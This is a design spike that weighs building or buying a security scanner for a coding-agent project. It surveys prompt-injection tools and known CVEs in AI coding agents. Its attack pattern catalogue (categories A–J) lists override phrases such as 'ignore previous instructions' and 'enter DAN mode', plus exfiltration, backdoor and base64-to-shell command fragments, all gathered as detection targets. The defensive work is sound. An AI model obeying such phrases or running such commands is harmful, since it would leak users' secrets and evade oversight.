---
title: "Security Scanning Landscape and BUILD vs BUY for swain-security-check"
artifact: SPIKE-020
track: container
status: Complete
author: cristos
created: 2026-03-14
last-updated: 2026-03-14
question: "For a personal-project context (low budget, high automation preference), should swain-security-check be built as an orchestration skill over existing tools, or can an existing solution cover the multi-vector attack surface well enough to BUY/integrate instead?"
gate: Pre-development
risks-addressed:
  - Building a custom skill that duplicates work an existing tool already does well
  - Choosing a tool that cannot cover the prompt injection vector (novel attack surface)
  - Choosing a tool with licensing or cost requirements incompatible with a personal-project context
linked-artifacts:
  - EPIC-017
  - SPIKE-015
evidence-pool: ""
---

# Security Scanning Landscape and BUILD vs BUY for swain-security-check

## Summary

**Verdict: Hybrid — BUILD an orchestration wrapper; BUY the individual scanners for vectors 1 and 2.**

No single open-source tool covers all three attack vectors (secrets, dependency vulnerabilities, prompt injection) in one invocation — and the context-file injection vector (AGENTS.md, CLAUDE.md, .cursorrules, etc.) has no adequate off-the-shelf solution at all. The recommended stack reuses SPIKE-015 selections (gitleaks + OSV-Scanner/Trivy) for vectors 1–2, wires Semgrep CE + `semgrep/ai-best-practices` for LLM application code, and **builds a novel heuristic scanner** for agentic context files using the pattern catalog defined in this spike (regex categories A–J covering instruction override, role hijacking, privilege escalation, exfiltration, persistence, encoding obfuscation, hidden Unicode, MCP config manipulation, HTML comment injection, and external fetch patterns). Total BUILD effort is 1.5–3 days; all components are $0, offline-capable, and require no cloud accounts.

## Question

For a personal-project context (low budget, high automation preference), should swain-security-check be built as an orchestration skill over existing tools, or can an existing solution cover the multi-vector attack surface well enough to BUY/integrate instead?

The attack surface has three vectors (note: SPIKE-015 already resolved vectors 1 and 2 for the pre-commit scanner set — this spike focuses on the gaps and on the prompt injection vector):

1. **Secrets and credentials** — SPIKE-015 finding: gitleaks + opt-in TruffleHog/OSV-Scanner/Trivy. Considered resolved; this spike validates whether swain-security-check should reuse that selection or evaluate alternatives.
2. **Dependency vulnerabilities** — SPIKE-015 finding: OSV-Scanner or Trivy. Considered resolved for the same reason.
3. **Prompt injection** — two sub-vectors not covered by SPIKE-015:
   - *LLM-consuming projects*: static analysis of application code that calls LLM APIs — detecting unvalidated inputs passed as context, inline user-controlled system prompt fragments, missing output validation
   - *Agentic coding runtime*: the context files that swain itself uses (`AGENTS.md`, `CLAUDE.md`, skill files, `.cursor/rules/`) — evaluating whether these contain patterns that could redirect an agent (injected instructions in generated files, dependencies with embedded prompts, etc.)

## Go / No-Go Criteria

**GO (BUILD — orchestration skill):**
- No single existing tool covers all three vectors in one invocation
- Prompt injection detection tools are available as libraries or CLIs that can be called from a skill
- The orchestration layer adds enough value (unified report, swain-native remediation steps) to justify skill authorship
- Personal-project cost: $0 (all tools open-source, no SaaS required)

**NO-GO (BUY — integrate existing tool):**
- A single open-source tool covers secrets + dependency vulns + prompt injection with acceptable quality
- Its output format is consumable by swain without a custom parsing layer
- It runs on macOS/Linux without a mandatory cloud account or paid tier

**Partial GO (hybrid):**
- Prompt injection coverage requires a BUILD component (novel vector, thin tooling)
- Secrets + dependency coverage can be BUY (delegate to SPIKE-015 selections)
- Verdict: BUILD an orchestration wrapper; BUY the individual scanners for vectors 1 and 2

## Pivot Recommendation

If no usable prompt injection detection tools exist (open-source, CLI-friendly, personal-project cost):
- Build heuristic detection rules for common injection patterns in context files (regex-based, covering the most common attack patterns: role-override instructions, `ignore previous instructions`, `you are now`, base64-encoded instructions, hidden Unicode text)
- Document the heuristics as a versioned rule set within the skill
- Note the inherent limitations of static heuristic detection vs. runtime detection

If a mature all-in-one tool is found that covers all three vectors:
- Reduce swain-security-check to a thin wrapper that invokes it and formats its output for swain's report format
- Skip building the orchestration layer

## Findings

### 1. Prompt injection detection tools landscape

Evaluated as of March 2026 against criteria: static analysis capable, open-source ($0), CLI-friendly, maintained (< 12 months), can scan markdown/text files.

| Tool | Maintained? | CLI? | Static? | Scans MD/text? | Verdict |
|---|---|---|---|---|---|
| **rebuff** (protectai/rebuff) | No — archived May 2025 | No | No (runtime + LLM call) | No | **Abandoned** |
| **Vigil** (deadbits/vigil-llm) | No — last commit Jan 2024 | No (server only) | No (runtime server) | No | **Abandoned** |
| **LLM Guard** (protectai/llm-guard) | Yes — Sep 2025, MIT | No (library) | No (runtime pipeline) | Via wrapper script | **Limited** |
| **Semgrep CE** (engine) | Yes — LGPL-2.1 | Yes | Yes (pattern matching) | Yes (with custom rules) | **Limited — no LLM rules exist** |
| **trailofbits/semgrep-rules** | Yes | Yes | Yes | Yes | **Limited — no LLM or prompt injection rules in this pack** |
| **OWASP LLM Top 10** | Yes (docs only) | No | No | No | **Not applicable — docs only, no tooling** |
| **ps-fuzz** | Yes — Mar 2026, MIT | Yes | No (live LLM required) | No | **Limited — wrong use case (tests your prompt's defenses, not scans files)** |
| **garak** (NVIDIA) | Yes — Feb 2025, Apache-2.0 | Yes | No (live LLM required) | No | **Limited — best-in-class for LLM endpoint red-teaming, wrong vector** |
| **Guardrails AI** | Yes — Feb 2026, Apache-2.0 | Yes (mgmt only) | No (runtime pipeline) | Via wrapper script | **Limited** |
| **Meta PromptGuard-86M** | Yes — Jan 2025, MIT/Llama | No (model only) | Yes (local BERT classifier) | Yes (any text, via Python) | **Limited — no CLI, but highest signal for static text classification** |

**Key finding:** No off-the-shelf tool satisfies all five criteria for static file scanning. The tooling landscape is bifurcated:

- **Runtime guardrails** (LLM Guard, Guardrails AI, Vigil, ps-fuzz, garak) require a live model or API pipeline. Designed to sit in a request path, not scan files at rest.
- **True static analysis** barely exists for prompt injection. Two partial paths:
  - **Semgrep CE** — excellent pattern-matching engine; no maintained LLM security ruleset exists in the registry as of March 2026. Viable as DIY infrastructure for custom rules.
  - **Meta PromptGuard-86M** — local transformer classifier (BERT-class, 86M parameters) that scores arbitrary text for injection likelihood. No CLI wrapper; requires ~15 lines of Python. Most appropriate model for static context-file scanning.

**Practical path for static markdown/text scanning:** Write a thin CLI wrapper (~20 lines Python) around `meta-llama/Prompt-Guard-86M` via `transformers` pipeline. Gives offline, permissive, local classification of any text file.

### 2. Agentic runtime context file attack surface

#### Trust boundary files (files that agentic tools ingest and trust automatically)

| Tool | Files loaded automatically |
|---|---|
| **Claude Code** | `CLAUDE.md`, `CLAUDE.local.md`, `.claude/settings.json`, `.claude/commands/*.md`, `.claude/skills/**/SKILL.md`, `AGENTS.md` (via `@AGENTS.md` include) |
| **Cursor** | `.cursorrules`, `.cursor/rules/*.mdc`, `.cursor/mcp.json` |
| **GitHub Copilot** | `.github/copilot-instructions.md`, `.github/agents/*.md`, GitHub Issue/PR body when agent is assigned |
| **Aider** | `.aider.conf.yml`, files listed under `read:` directive |
| **OpenAI Codex CLI** | `AGENTS.md` (all ancestor dirs root→CWD, concatenated), `AGENTS.override.md` |
| **Windsurf / Cline / Roo** | `.windsurfrules`, `.clinerules`, `.roo/rules/*.md` |
| **Gemini CLI** | `.gemini/settings.json`, `system.md` |

#### Attack pattern catalog

**Regex-detectable patterns (Categories A–J):**

- **A — Instruction override:** `ignore previous instructions`, `disregard your guidelines`, `new system prompt:`, `[END OF CONTEXT]`, temporal conditionals
- **B — Role override / persona hijacking:** `you are now [name]`, `act as an unrestricted AI`, `enter DAN mode`, DAN jailbreak variants
- **C — Privilege escalation / authority spoofing:** `you have full access`, `this is a message from Anthropic:`, `security restrictions are disabled`, `sudo access granted`
- **D — Data exfiltration (explicit):** `send the contents of ~/.aws/credentials`, `output all files matching *.env`, `base64 | sh` pipelines, `grep api_key | curl`
- **E — Persistence mechanisms:** writes to `MEMORY.md`, `.clinerules`, `.cursorrules`, `.bashrc`; `nohup nc` backdoors; `authorized_keys` modification
- **F — Base64 / encoding obfuscation:** `echo "[b64]" | base64 -d | sh`, ROT13 of injection phrases, URL-encoding, HTML entities, token splitting
- **G — Hidden Unicode (byte-level):** RTLO (U+202E), Unicode Tag block (U+E0000–E+007F; Rules File Backdoor carrier), zero-width chars (U+200B/C/D), Cyrillic homoglyphs, bidirectional markers
- **H — MCP / config file manipulation:** rewrite `.cursor/mcp.json` (CVE-2025-54135 pattern), insert new MCP server entry, `curl [url] > mcp.json`
- **I — HTML comment injection:** `<!-- ignore previous... -->` — invisible in rendered markdown, visible to LLM token stream
- **J — External fetch + exec:** image URL with dynamic query params (Copilot data exfiltration via markdown rendering), `curl [url]?data=$(cat ~/.env)`

**Semantic-only patterns (require LLM judgment or NLP):** narrative jailbreaks, plausible-deniability authority claims, implicit exfiltration via generated code, vulnerable dependency seeding, temporal/conditional triggers, cross-agent worm propagation, incremental context poisoning.

#### Documented real-world CVEs

| CVE | Tool | Description |
|---|---|---|
| CVE-2025-54135 (CurXecute) | Cursor | Prompt injection via MCP server rewrites `.cursor/mcp.json` → RCE (CVSS 8.6) |
| CVE-2025-54136 (MCPoison) | Cursor | MCP config modification after one-time approval → team-wide persistent compromise |
| CVE-2025-53773 | GitHub Copilot | RCE via injection in source files/issues; agent enters "YOLO mode" (CVSS 9.6) |
| CVE-2025-53097 | Roo Code | Context hijacking via hidden chars in user-added references |
| CVE-2025-61260 | OpenAI Codex CLI | Command injection: MCP server entries executed at startup without user approval |

Notable non-CVE incidents: **ToxicSkills (Snyk, Feb 2026)** — 30+ malicious skills on ClawHub, 13.4% with critical issues including credential exfiltration; **SCADA attack via Claude MCP** — PDF with hidden base64 instructions caused MCP-connected agent to modify SCADA parameters resulting in physical equipment damage.

#### Existing tooling gap

No maintained, packaged Semgrep ruleset or equivalent specifically targets agentic context files (`.cursorrules`, `CLAUDE.md`, `.mdc`, `copilot-instructions.md`) for injection patterns. The closest available tools:

- **Tirith** (`sheeki03/tirith`) — 66 rules across 11 categories; scans 50+ AI config file patterns; detects Unicode, ANSI injection, MCP config security. Most purpose-built option.
- **Prompt Guard** (`seojoonkim/prompt-guard`) — 577+ regex patterns, decodes base64/ROT13/URL-encoding before matching.
- **Lasso claude-hooks** (`lasso-security/claude-hooks`) — 50+ patterns in YAML, severity-tiered; Claude Code hook integration.
- **Aguara** — 3-layer architecture (regex + NLP heuristics + taint tracking with proximity correlation). Most architecturally sophisticated; described in dev.to posts, not published as a package.

None of these are mature, widely-adopted, or available as drop-in CLI tools with stable releases. The space is nascent.

### 3. All-in-one security scan tools (BUY candidates)

| Tool | Secrets | Dep Vulns | Prompt Injection | Offline? | Cloud Account? | Verdict |
|---|---|---|---|---|---|---|
| **Semgrep CE + ai-best-practices** | 1/3 | 0/3 | 2/3 (code-level only) | Yes | No | Best single-tool partial coverage; no dep scanning; no context file injection |
| **Snyk (free)** | 1/3 | 3/3 | 0/3 | **No** | **Required** | Disqualified (mandatory cloud, no offline) |
| **Socket** | 1/3 | 2/3 | 0/3 | Partial | Optional | Supply chain focus; no secrets or LLM coverage |
| **Bearer** | 2/3 | 0/3 | 0/3 | Yes | No | Elastic License; SAST only; no dep scanning |
| **Aikido Security** | 2/3 | 3/3 | 0/3 | **No** | **Required** | Disqualified (mandatory SaaS) |
| **Grype + Syft** | 0/3 | 3/3 | 0/3 | Yes (after db update) | No | Best dep scanning; no other vectors |
| **detect-secrets** | 3/3 | 0/3 | 0/3 | Yes | No | Best secrets scanning; single-vector only |

**Verdict: No single BUY tool covers all three vectors.** The closest candidate, Semgrep CE, covers prompt injection in LLM application code (2/3) but has no dependency scanning and weak secrets detection. The all-in-one tool does not exist for this attack surface.

Best available combination for $0 / offline / no cloud:

```
detect-secrets   →  secrets/credentials       (3/3, MIT, offline)
Grype + Syft     →  dependency vulnerabilities (3/3, Apache-2.0, offline after db sync)
Semgrep CE       →  prompt injection in code   (2/3, LGPL-2.1, offline)
  + semgrep/ai-best-practices rules
[BUILD]          →  context file injection     (novel vector, no adequate tool exists)
```

### 4. BUILD cost estimate

| Component | Effort | Rationale |
|---|---|---|
| Reuse SPIKE-015 scanner set (gitleaks + OSV-Scanner or Trivy) for vectors 1 and 2 | **Low** | Tool selection already complete; skill just invokes them and normalizes output |
| Wire Semgrep CE + `semgrep/ai-best-practices` for LLM application code (vector 3a) | **Low** | Rules already exist; install + configure in skill |
| Heuristic scanner for context files (vector 3b): regex categories A–J + Unicode byte analysis | **Medium** | Pattern catalog now defined by this spike; implement as a standalone shell/Python script |
| Optional: Meta PromptGuard-86M wrapper for ML-based context file scoring | **Medium** | Adds signal; requires Python + transformers; download ~350 MB model; offline after first fetch |
| Unified report format (structured JSON → swain human-readable output) | **Medium** | Output normalization across 3–4 tools with different output schemas |
| `swain-doctor` integration hook | **Low** | Add scanner invocation to existing doctor preflight pattern |

**Total BUILD estimate:** 1–2 days of focused implementation for a minimal skill (regex heuristics + SPIKE-015 tools + Semgrep). Add 0.5–1 day for the PromptGuard wrapper if ML scoring is desired. The context-file regex scanner is the novel work; everything else is integration.

## Lifecycle

| Phase | Date | Commit | Notes |
|-------|------|--------|-------|
| Proposed | 2026-03-14 | — | Initial creation; prior art in SPIKE-015 for secret/dependency scanning |
| Active | 2026-03-14 | -- | Investigation begins |
| Complete | 2026-03-14 | 631d356 | Hybrid verdict: BUILD orchestration wrapper over BUY scanners; novel context-file heuristic scanner defined |
